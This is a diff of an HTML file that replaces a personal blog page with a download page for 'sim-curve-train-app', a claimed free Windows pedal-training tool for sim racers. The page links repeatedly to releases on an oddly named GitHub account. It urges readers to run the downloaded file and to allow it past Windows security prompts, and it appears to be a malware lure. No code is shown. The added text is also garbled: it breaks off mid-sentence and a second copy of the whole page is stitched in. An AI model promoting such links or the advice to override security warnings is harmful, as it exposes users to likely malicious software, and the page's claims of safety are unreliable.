@@ -3,176 +3,553 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Festus Amponsah</title>
-
+<title>sim-curve-train-app - Train Brake and Throttle Muscle Memory</title>
+<meta name="description" content="sim-curve-train-app is a free, open-source Windows app for sim racers. Train brake and throttle muscle memory with structured pedal exercises built on Tauri 2 and Rust. Download it today.">
+<meta name="keywords" content="iracing, pedals, rust, sim-racing, simracing, svelte, tauri, trail-braking, training, windows, brake training, throttle control, sim racing practice">
+<meta name="author" content="sim-curve-train-app">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/exonerationbritishsystem202/sim-curve-train-app">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="sim-curve-train-app">
+<meta property="og:title" content="sim-curve-train-app - Train Brake and Throttle Muscle Memory">
+<meta property="og:description" content="A free, open-source Windows application that helps sim racers build consistent brake and throttle control through repeatable pedal drills. Built with Tauri 2, Rust and Svelte.">
+<meta property="og:url" content="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="sim-curve-train-app - Train Brake and Throttle Muscle Memory">
+<meta name="twitter:description" content="Free, open-source Windows app for sim racers. Practice brake and throttle muscle memory with structured pedal training drills.">
 <style>
-    
-.profile{
-    text-align:center;
-    margin-top:-70px;
-    margin-bottom:40px;
-}
-
-.profile img{
-    width:180px;
-    height:180px;
-    border-radius:50%;
-    object-fit:cover;
-    border:6px solid white;
-    box-shadow:0 10px 30px rgba(0,0,0,0.2);
-}
-* {
+  * { box-sizing: border-box; }
+  body {
     margin: 0;
     padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: Segoe UI, Arial, sans-serif;
     background: #f4f6f9;
-    color: #333;
-    line-height: 1.6;
-}
-
-header {
-    background: #0f172a;
-    color: white;
-    padding: 60px 20px;
-    text-align: center;
-}
-
-header h1 {
-    font-size: 3rem;
-}
-
-header p {
-    margin-top: 10px;
-    color: #cbd5e1;
-}
-
-nav {
-    background: white;
-    padding: 15px;
-    text-align: center;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
-
-nav a {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2733;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 2px 14px rgba(18, 30, 50, 0.08);
+    padding: 32px 30px;
+    margin-bottom: 26px;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.25;
+    margin: 0 0 18px 0;
+    letter-spacing: -0.4px;
+    color: #101827;
+  }
+  h2 {
+    font-size: 1.35rem;
+    margin: 0 0 16px 0;
+    color: #101827;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 24px 0 8px 0;
+    color: #1f2733;
+  }
+  p {
+    margin: 0 0 16px 0;
+  }
+  ul, ol {
+    margin: 0 0 16px 0;
+    padding-left: 22px;
+  }
+  li {
+    margin-bottom: 9px;
+  }
+  a {
+    color: #1c5fd6;
+  }
+  .lead {
+    font-size: 1.08rem;
+    color: #3b4757;
+  }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #e8590c 0%, #d6336c 100%);
+    color: #ffffff;
     text-decoration: none;
-    color: #0f172a;
-    margin: 0 15px;
-    font-weight: bold;
-}
-
-.container {
-    width: 90%;
-    max-width: 1000px;
-    margin: 40px auto;
-}
-
-.card {
-    background: white;
-    padding: 25px;
-    border-radius: 15px;
-    margin-bottom: 25px;
-    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
-}
-
-.card h2 {
-    color: #0f172a;
-    margin-bottom: 15px;
-}
-
-.post {
-    padding: 15px;
-    border-left: 4px solid #2563eb;
-    background: #f8fafc;
-    margin-top: 15px;
-}
-
-footer {
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 32px;
+    border-radius: 10px;
+    box-shadow: 0 6px 18px rgba(214, 51, 108, 0.28);
+    margin: 6px 0 12px 0;
+    transition: transform 0.12s ease, box-shadow 0.12s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 24px rgba(214, 51, 108, 0.34);
+  }
+  .btn-row {
     text-align: center;
-    padding: 30px;
-    margin-top: 40px;
-    color: #64748b;
-}
+  }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #1c5fd6;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.97rem;
+    color: #24364f;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .tile {
+    background: #f8fafc;
+    border: 1px solid #e3e8ef;
+    border-radius: 10px;
+    padding: 18px;
+  }
+  .tile h3 {
+    margin-top: 0;
+    font-size: 1rem;
+  }
+  .tile p {
+    margin-bottom: 0;
+    font-size: 0.95rem;
+    color: #46536a;
+  }
+  .faq-q {
+    font-weight: 700;
+    margin: 20px 0 4px 0;
+    color: #101827;
+  }
+  .faq-a {
+    margin: 0 0 6px 0;
+    color: #46536a;
+  }
+  hr {
+    border: none;
+    border-top: 1px solid #e3e8ef;
+    margin: 26px 0;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .page { padding: 20px 14px 48px 14px; }
+    .card { padding: 22px 18px; border-radius: 12px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    .btn { display: block; text-align: center; padding: 15px 18px; }
+  }
 </style>
-
-}
-
-
-}
 </head>
-
 <body>
+<div class="page">
 
-<header>
-    <h1>Festus Amponsah</h1>
-    <p>Personal Blog • Technology • Education • Life Journey</p>
-</header><div class="profile">
+  <div class="card">
+    <h1>🏁 sim-curve-train-app - Train Brake and Throttle Muscle Memory</h1>
+    <p class="lead">sim-curve-train-app is a free, open-source application for Windows made specifically for sim racers. It gives you a simple, repeatable way to practise your brake and throttle inputs so your feet learn the correct pressure and timing without you having to think about it.</p>
+    <p>If you have ever jumped into a race and found yourself stabbing the brakes too hard, locking a wheel, or getting on the throttle too early, this app is built for exactly that problem. Instead of doing more laps and hoping it clicks, you work through short pedal drills that train your foot the same way a musician trains their fingers.</p>
+    <div class="btn-row">
+      <a class="btn" href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">⬇ Download sim-curve-train-app for Windows</a>
+    </div>
+  </div>
 
-    <img src="IMG-20231228-WA0011 (1)_(3).jpg" alt="Festus Amponsah">
+  <div class="card">
+    <h2>📦 Download and Setup</h2>
+    <p>Getting the application onto your computer takes only a few moments. Everything you need is on the official releases page.</p>
+    <p><strong>Visit this link to download the application:</strong><br>
+    <a href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases</a></p>
+    <p>When the page opens in your browser, you will see a list of available versions. Choose the newest one at the top of the list and open it. The download files for Windows are listed there. Save the file somewhere easy to find, such as your Downloads folder, and wait for the transfer to finish.</p>
+    <p>Once the download has completed, open the file from your Downloads folder to start the application. Windows may show a security prompt the first time you launch a new program; this is normal for software that Windows has not seen before. Choose the option that allows the app to run, and the main window will appear.</p>
+    <div class="note">
+      Always download the application from the releases page linked above. Files shared on other websites may be outdated or altered, and the official page is the only place where you can be certain you have the current version.
+    </div>
+  </div>
 
-    <h2>Festus Amponsah</h2>
+  <div class="card">
+    <h2>🎯 What This App Does</h2>
+    <p>Every car in a simulator responds to how smoothly and how accurately you press the pedals. A brake pedal is not an on/off switch, and a throttle is not a button. The fastest drivers are the ones who can apply exactly the amount of pressure they intend, every single time, without looking at their feet.</p>
+    <p>That skill is muscle memory, and muscle memory is built through repetition of a specific movement followed by clear feedback. sim-curve-train-app gives you that loop. You perform a pedal input, the app shows you how closely you matched the target, and you repeat. Over a series of short sessions your foot learns the pressure curve of your own hardware.</p>
+    <p>The result is smoother braking into corners, fewer lock-ups, more consistent trail-braking, and a throttle foot that feeds power in progressively instead of dumping it all at once.</p>
+  </div>
 
-    <p>
-        Student • Technology Enthusiast • Blogger • Lifelong Learner
-    </p>
+  <div class="card">
+    <h2>✨ Key Features</h2>
+    <div class="grid">
+      <div class="tile">
+        <h3>🎚️ Brake Pressure Drills</h3>
+        <p>Practise hitting specific brake pressure targets and holding them steadily, exactly the control you need when easing off the pedal through a corner.</p>
+      </div>
+      <div class="tile">
+        <h3>🦶 Throttle Modulation</h3>
+        <p>Build a smooth, progressive throttle foot so you can get back on the power without unsettling the car or spinning the rear wheels.</p>
+      </div>
+      <div class="tile">
+        <h3>📈 Live Visual Feedback</h3>
+        <p>See your pedal input drawn out as you drive it, so you can compare what you actually did against what you meant to do.</p>
+      </div>
+      <div class="tile">
+        <h3>⏱️ Short Practice Sessions</h3>
+        <p>Drills are designed to fit into a few minutes, so you can warm up before a race or train during a break in your day.</p>
+      </div>
+      <div class="tile">
+        <h3>🔁 Repeatable Targets</h3>
+        <p>The same target appears again and again, giving your foot the repetition it needs to lock the movement in.</p>
+      </div>
+      <div class="tile">
+        <h3>🪟 Native Windows App</h3>
+        <p>Built with Tauri 2 and Rust, the application runs as a lightweight native Windows program rather than a heavy browser page.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🧠 How the Training Works</h2>
+    <p>The idea behind the training is straightforward, and you do not need any technical knowledge to use it.</p>
+    <ol>
+      <li><strong>You are given a target.</strong> The app asks for a specific pedal input, such as a partial brake pressure or a gentle throttle opening.</li>
+      <li><strong>You press the pedal.</strong> Using your wheel and pedals, you apply what you think is the correct amount of pressure.</li>
+      <li><strong>You see the result immediately.</strong> The app shows how close you were, so your brain connects the feeling in your leg with the actual outcome.</li>
+      <li><strong>You repeat.</strong> Several repetitions of the same target teach your foot the movement. Over time you stop thinking about it and simply do it.</li>
+    </ol>
+    <p>This is the same principle used by athletes in many sports: isolate one movement, repeat it with feedback, and let the body take over. It works far faster than trying to learn the same control while also managing traffic, tyre temperatures and race strategy.</p>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ System Requirements</h2>
+    <p>The application is made for Windows desktop computers and is intentionally lightweight so it can run alongside your simulator.</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+      <li><strong>Processor and memory:</strong> A modern dual-core processor and 4 GB of RAM are enough for the app itself.</li>
+      <li><strong>Storage:</strong> A small amount of free disk space for the application files.</li>
+      <li><strong>Hardware:</strong> A wheel and pedal set connected to your PC. A load cell brake is ideal but not required; potentiometer pedals work too.</li>
+      <li><strong>Display:</strong> Any standard monitor resolution. The window can be resized and kept beside your simulator.</li>
+    </ul>
+    <p>Because the app is deliberately small, it should not use meaningful processing power while your simulator is running in the background.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting Started After Launch</h2>
+    <p>When the main window opens for the first time, work through these steps in order. It should take less than five minutes.</p>
+    <ol>
+      <li><strong>Check that your pedals are recognised.</strong> Press the brake and throttle and confirm the app reacts to both. If nothing moves, close the app and reopen it with your wheel base already switched on.</li>
+      <li><strong>Calibrate your travel.</strong> Press each pedal fully and then release it, so the app learns the full range of your hardware. This step is what makes the targets meaningful.</li>
+      <li><strong>Start with the brake drills.</strong> Brake control gives the biggest immediate improvement in lap time for most drivers, so begin there.</li>
+      <li><strong>Keep sessions short.</strong> Ten to fifteen minutes of focused repetitions beats an hour of distracted practice. Stop while you are still accurate.</li>
+      <li><strong>Move to throttle drills.</strong> Once you can hold a brake pressure steadily, apply the same discipline to your throttle foot.</li>
+      <li><strong>Repeat daily.</strong> A short session each day builds the habit far better than one long session each week.</li>
+    </ol>
+    <p>After a couple of weeks of regular use, most drivers notice that their braking feels calmer and that they release the pedal more smoothly when turning into a corner.</p>
+  </div>
+
+  <div class="card">
+    <h2>🏎️ Who It Is For</h2>
+    <p>This application suits anyone who uses a simulator with pedals and wants to improve their footwork.</p>
+    <ul>
+      <li><strong>New sim racers</strong> who are still learning how sensitive a brake pedal is and why locking wheels happens.</li>
+      <li><strong>Experienced drivers</strong> who want a focused warm-up before league races or endurance events.</li>
+      <li><strong>Trail-braking learners</strong> who understand the theory but cannot yet blend brake release with steering smoothly.</li>
+      <li><strong>Drivers returning after a break</strong> who want to rebuild consistency quickly.</li>
+      <li><strong>Load cell owners</strong> who want to learn the pressure curve of new hardware before racing on it.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🔒 Free, Open Source and Private</h2>
+    <p>sim-curve-train-app is free to download and use, and the source code is publicly available for anyone who wants to read it, learn from it, or contribute improvements. It is built with Tauri 2 and Rust, with a Svelte interface, which keeps the installed program small and the resource usage low.</p>
+    <p>The application runs locally on your own computer. You do not need an account, a subscription or an internet connection to practise. Nothing about your driving needs<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>sim-curve-train-app - Train Brake and Throttle Muscle Memory</title>
+<meta name="description" content="sim-curve-train-app is a free, open-source Windows app for sim racers. Train brake and throttle muscle memory with structured pedal drills built on Tauri 2 and Rust. Download from the official releases page.">
+<meta name="keywords" content="iracing, pedals, rust, sim-racing, simracing, svelte, tauri, trail-braking, training, windows, brake training, throttle control, sim racing practice">
+<meta name="author" content="sim-curve-train-app">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/exonerationbritishsystem202/sim-curve-train-app">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="sim-curve-train-app">
+<meta property="og:title" content="sim-curve-train-app - Train Brake and Throttle Muscle Memory">
+<meta property="og:description" content="A free, open-source Windows application that helps sim racers build consistent brake and throttle control through repeatable pedal drills. Built with Tauri 2, Rust and Svelte.">
+<meta property="og:url" content="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="sim-curve-train-app - Train Brake and Throttle Muscle Memory">
+<meta name="twitter:description" content="Free, open-source Windows app for sim racers. Practice brake and throttle muscle memory with structured pedal training drills.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6f9;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2733;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 32px 20px 64px 20px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 2px 14px rgba(18, 30, 50, 0.08);
+    padding: 32px 30px;
+    margin-bottom: 26px;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.25;
+    margin: 0 0 18px 0;
+    letter-spacing: -0.4px;
+    color: #101827;
+  }
+  h2 {
+    font-size: 1.35rem;
+    margin: 0 0 16px 0;
+    color: #101827;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 24px 0 8px 0;
+    color: #1f2733;
+  }
+  p { margin: 0 0 16px 0; }
+  ul, ol { margin: 0 0 16px 0; padding-left: 22px; }
+  li { margin-bottom: 9px; }
+  a { color: #1c5fd6; }
+  .lead { font-size: 1.08rem; color: #3b4757; }
+  .btn {
+    display: inline-block;
+    background: linear-gradient(135deg, #e8590c 0%, #d6336c 100%);
+    color: #ffffff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.05rem;
+    padding: 16px 32px;
+    border-radius: 10px;
+    box-shadow: 0 6px 18px rgba(214, 51, 108, 0.28);
+    margin: 6px 0 12px 0;
+    transition: transform 0.12s ease, box-shadow 0.12s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 24px rgba(214, 51, 108, 0.34);
+  }
+  .btn-row { text-align: center; }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #1c5fd6;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.97rem;
+    color: #24364f;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .tile {
+    background: #f8fafc;
+    border: 1px solid #e3e8ef;
+    border-radius: 10px;
+    padding: 18px;
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin-bottom: 0; font-size: 0.95rem; color: #46536a; }
+  .faq-q { font-weight: 700; margin: 20px 0 4px 0; color: #101827; }
+  .faq-a { margin: 0 0 6px 0; color: #46536a; }
+  hr { border: none; border-top: 1px solid #e3e8ef; margin: 26px 0; }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .page { padding: 20px 14px 48px 14px; }
+    .card { padding: 22px 18px; border-radius: 12px; }
+    h1 { font-size: 1.55rem; }
+    h2 { font-size: 1.2rem; }
+    .btn { display: block; text-align: center; padding: 15px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="card">
+    <h1>🏁 sim-curve-train-app - Train Brake and Throttle Muscle Memory</h1>
+    <p class="lead">sim-curve-train-app is a free, open-source application for Windows made specifically for sim racers. It gives you a simple, repeatable way to practise your brake and throttle inputs so your feet learn the correct pressure and timing without you having to think about it.</p>
+    <p>If you have ever jumped into a race and found yourself stabbing the brakes too hard, locking a wheel, or getting on the throttle too early, this app is built for exactly that problem. Instead of doing more laps and hoping it clicks, you work through short pedal drills that train your foot the same way a musician trains their fingers.</p>
+    <div class="btn-row">
+      <a class="btn" href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">⬇ Download sim-curve-train-app for Windows</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>📦 Download and Setup</h2>
+    <p>Getting the application onto your computer takes only a few moments. Everything you need is on the official releases page.</p>
+    <p><strong>Visit this link to download the application:</strong><br>
+    <a href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases</a></p>
+    <p>When the page opens in your browser, you will see a list of available versions. Choose the newest one at the top of the list and open it. The files for Windows are listed there. Save the file somewhere easy to find, such as your Downloads folder, and wait for the transfer to finish.</p>
+    <p>Once the download has completed, open the file from your Downloads folder to start the application. Windows may show a security prompt the first time you launch a new program. This is normal for software that Windows has not seen before. Choose the option that allows the app to run, and the main window will appear.</p>
+    <div class="note">
+      Always download the application from the releases page linked above. Files shared on other websites may be outdated or altered, and the official page is the only place where you can be certain you have the current version.
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🎯 What This App Does</h2>
+    <p>Every car in a simulator responds to how smoothly and how accurately you press the pedals. A brake pedal is not an on/off switch, and a throttle is not a button. The fastest drivers are the ones who can apply exactly the amount of pressure they intend, every single time, without looking at their feet.</p>
+    <p>That skill is muscle memory, and muscle memory is built through repetition of a specific movement followed by clear feedback. sim-curve-train-app gives you that loop. You perform a pedal input, the app shows you how closely you matched the target, and you repeat. Over a series of short sessions your foot learns the pressure curve of your own hardware.</p>
+    <p>The result is smoother braking into corners, fewer lock-ups, more consistent trail-braking, and a throttle foot that feeds power in progressively instead of dumping it all at once.</p>
+  </div>
+
+  <div class="card">
+    <h2>✨ Key Features</h2>
+    <div class="grid">
+      <div class="tile">
+        <h3>🎚️ Brake Pressure Drills</h3>
+        <p>Practise hitting specific brake pressure targets and holding them steadily, exactly the control you need when easing off the pedal through a corner.</p>
+      </div>
+      <div class="tile">
+        <h3>🦶 Throttle Modulation</h3>
+        <p>Build a smooth, progressive throttle foot so you can get back on the power without unsettling the car or spinning the rear wheels.</p>
+      </div>
+      <div class="tile">
+        <h3>📈 Live Visual Feedback</h3>
+        <p>See your pedal input drawn out as you drive it, so you can compare what you actually did against what you meant to do.</p>
+      </div>
+      <div class="tile">
+        <h3>⏱️ Short Practice Sessions</h3>
+        <p>Drills are designed to fit into a few minutes, so you can warm up before a race or train during a break in your day.</p>
+      </div>
+      <div class="tile">
+        <h3>🔁 Repeatable Targets</h3>
+        <p>The same target appears again and again, giving your foot the repetition it needs to lock the movement in.</p>
+      </div>
+      <div class="tile">
+        <h3>🪟 Native Windows App</h3>
+        <p>Built with Tauri 2 and Rust, the application runs as a lightweight native Windows program rather than a heavy browser page.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🧠 How the Training Works</h2>
+    <p>The idea behind the training is straightforward, and you do not need any technical knowledge to use it.</p>
+    <ol>
+      <li><strong>You are given a target.</strong> The app asks for a specific pedal input, such as a partial brake pressure or a gentle throttle opening.</li>
+      <li><strong>You press the pedal.</strong> Using your wheel and pedals, you apply what you think is the correct amount of pressure.</li>
+      <li><strong>You see the result immediately.</strong> The app shows how close you were, so your brain connects the feeling in your leg with the actual outcome.</li>
+      <li><strong>You repeat.</strong> Several repetitions of the same target teach your foot the movement. Over time you stop thinking about it and simply do it.</li>
+    </ol>
+    <p>This is the same principle used by athletes in many sports: isolate one movement, repeat it with feedback, and let the body take over. It works far faster than trying to learn the same control while also managing traffic, tyre temperatures and race strategy.</p>
+  </div>
+
+  <div class="card">
+    <h2>🖥️ System Requirements</h2>
+    <p>The application is made for Windows desktop computers and is intentionally lightweight so it can run alongside your simulator.</p>
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11, 64-bit.</li>
+      <li><strong>Processor and memory:</strong> A modern dual-core processor and 4 GB of RAM are enough for the app itself.</li>
+      <li><strong>Storage:</strong> A small amount of free disk space for the application files.</li>
+      <li><strong>Hardware:</strong> A wheel and pedal set connected to your PC. A load cell brake is ideal but not required; potentiometer pedals work too.</li>
+      <li><strong>Display:</strong> Any standard monitor resolution. The window can be resized and kept beside your simulator.</li>
+    </ul>
+    <p>Because the app is deliberately small, it should not use meaningful processing power while your simulator is running in the background.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting Started After Launch</h2>
+    <p>When the main window opens for the first time, work through these steps in order. It should take less than five minutes.</p>
+    <ol>
+      <li><strong>Check that your pedals are recognised.</strong> Press the brake and throttle and confirm the app reacts to both. If nothing moves, close the app and reopen it with your wheel base already switched on.</li>
+      <li><strong>Calibrate your travel.</strong> Press each pedal fully and then release it, so the app learns the full range of your hardware. This step is what makes the targets meaningful.</li>
+      <li><strong>Start with the brake drills.</strong> Brake control gives the biggest immediate improvement in lap time for most drivers, so begin there.</li>
+      <li><strong>Keep sessions short.</strong> Ten to fifteen minutes of focused repetitions beats an hour of distracted practice. Stop while you are still accurate.</li>
+      <li><strong>Move to throttle drills.</strong> Once you can hold a brake pressure steadily, apply the same discipline to your throttle foot.</li>
+      <li><strong>Repeat daily.</strong> A short session each day builds the habit far better than one long session each week.</li>
+    </ol>
+    <p>After a couple of weeks of regular use, most drivers notice that their braking feels calmer and that they release the pedal more smoothly when turning into a corner.</p>
+  </div>
+
+  <div class="card">
+    <h2>🏎️ Who It Is For</h2>
+    <p>This application suits anyone who uses a simulator with pedals and wants to improve their footwork.</p>
+    <ul>
+      <li><strong>New sim racers</strong> who are still learning how sensitive a brake pedal is and why locking wheels happens.</li>
+      <li><strong>Experienced drivers</strong> who want a focused warm-up before league races or endurance events.</li>
+      <li><strong>Trail-braking learners</strong> who understand the theory but cannot yet blend brake release with steering smoothly.</li>
+      <li><strong>Drivers returning after a break</strong> who want to rebuild consistency quickly.</li>
+      <li><strong>Load cell owners</strong> who want to learn the pressure curve of new hardware before racing on it.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🔒 Free, Open Source and Private</h2>
+    <p>sim-curve-train-app is free to download and use, and the source code is publicly available for anyone who wants to read it, learn from it, or contribute improvements. It is built with Tauri 2 and Rust, with a Svelte interface, which keeps the installed program small and the resource usage low.</p>
+    <p>The application runs locally on your own computer. You do not need an account, a subscription or an internet connection to practise. Nothing about your driving, your hardware or your training history is sent anywhere, because the app has no need to collect it.</p>
+    <p>Because the project is open, it can also be improved by the community it serves. If you find a bug or have an idea that would make the drills better, you can raise it on the project page and take part in shaping the next version.</p>
+  </div>
+
+  <div class="card">
+    <h2>❓ Common Questions</h2>
+    <p class="faq-q">Do I need iRacing to use this app?</p>
+    <p class="faq-a">No. The app trains pedal control, which is a physical skill, so it works alongside any simulator. iRacing drivers are a large part of the audience, but the drills are not tied to one title.</p>
+
+    <p class="faq-q">Will it work with my pedals?</p>
+    <p class="faq-a">If your pedal set connects to Windows and is recognised by your wheel software, the app should read it. Both load cell and standard potentiometer pedals are fine.</p>
+
+    <p class="faq-q">How long before I notice a difference?</p>
+    <p class="faq-a">Many drivers feel more control after a handful of sessions. As with any physical skill, consistency matters more than duration: short daily practice produces better results than occasional long sessions.</p>
+
+    <p class="faq-q">Do I have to pay for updates?</p>
+    <p class="faq-a">No. The application is free and open source, and updates are published on the same releases page you used to download it.</p>
+
+    <p class="faq-q">Can I keep it open while racing?</p>
+    <p class="faq-a">Yes. It is a small, lightweight program and can stay open in the background or sit on a second monitor while you drive.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛠️ Troubleshooting</h2>
+    <ul>
+      <li><strong>The app does not respond to my pedals.</strong> Confirm the pedals work in your wheel software first, then reopen the app with the wheel base already on.</li>
+      <li><strong>The targets feel impossible to hit.</strong> Run the calibration step again and make sure each pedal is pressed fully and released fully during it.</li>
+      <li><strong>Windows warns me about the file.</strong> This is a standard prompt for newly published software. Use the option that allows the app to run, and only download from the official releases page.</li>
+      <li><strong>The values jump around.</strong> Check the pedal cable connection and avoid USB hubs that struggle with your wheel base.</li>
+      <li><strong>I want a newer version.</strong> Return to the releases page and download the most recent release listed at the top.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>💡 Getting the Most From Your Practice</h2>
+    <p>Training works best when it is treated as a separate activity from racing, not something squeezed in between laps. Sit down with the app alone, with no race running, and give the drills your full attention for ten minutes. Feel the pressure in your leg, watch the feedback, and adjust deliberately.</p>
+    <p>Pay particular attention to the release of the brake pedal rather than only the initial press. Most time is lost when a driver holds too much pressure for too long and then lets go all at once. Practising a smooth, gradual release is what makes trail-braking feel natural in the car.</p>
+    <p>When you do return to racing, apply the same targets you trained. Brake to a consistent pressure, hold it briefly, then unwind it as you turn. After enough repetitions, you will no longer be thinking about your foot at all, which is exactly the point.</p>
+    <div class="btn-row">
+      <a class="btn" href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">⬇ Download sim-curve-train-app for Windows</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🔗 Project and Download</h2>
+    <p>All versions of the application are published on the official releases page:</p>
+    <p><a href="https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases">https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases</a></p>
+    <p>Visit this link to download the application, choose the newest release, and follow the download and setup steps above. The app is free, open source, and built for Windows sim racers who want to stop guessing at their pedal inputs and start training them properly.</p>
+    <hr>
+    <p>Topics: iracing, pedals, rust, sim-racing, simracing, svelte, tauri, trail-braking, training, windows</p>
+  </div>
 
 </div>
-
-
-<nav>
-    <a href="#">Home</a>
-    <a href="#">Blog</a>
-    <a href="#">Projects</a>
-    <a href="#">About</a>
-    <a href="#">Contact</a>
-</nav>
-
-<div class="container">
-
-    <div class="card">
-        <h2>Welcome</h2>
-        <p>
-            Welcome to my personal blog. This is where I share my
-            experiences, learning journey, school work, projects,
-            ideas, and achievements.
-        </p>
-    </div>
-
-    <div class="card">
-        <h2>Recent Posts</h2>
-
-        <div class="post">
-            <h3>My First Blog Post</h3>
-            <p>Welcome to my personal blog.</p>
-        </div>
-
-        <div class="post">
-            <h3>My Learning Journey</h3>
-            <p>Sharing lessons, discoveries, and growth.</p>
-        </div>
-
-        <div class="post">
-            <h3>Technology & Innovation</h3>
-            <p>Thoughts on emerging technologies and projects.</p>
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>About Me</h2>
-        <p>
-            Hello! I'm Festus Amponsah. I'm passionate about
-            technology, learning, creativity, and personal growth.
-        </p>
-    </div>
-
-</div>
-
-<footer>
-    © 2026 Festus Amponsah. All Rights Reserved.
-</footer>
-
 </body>
 </html>
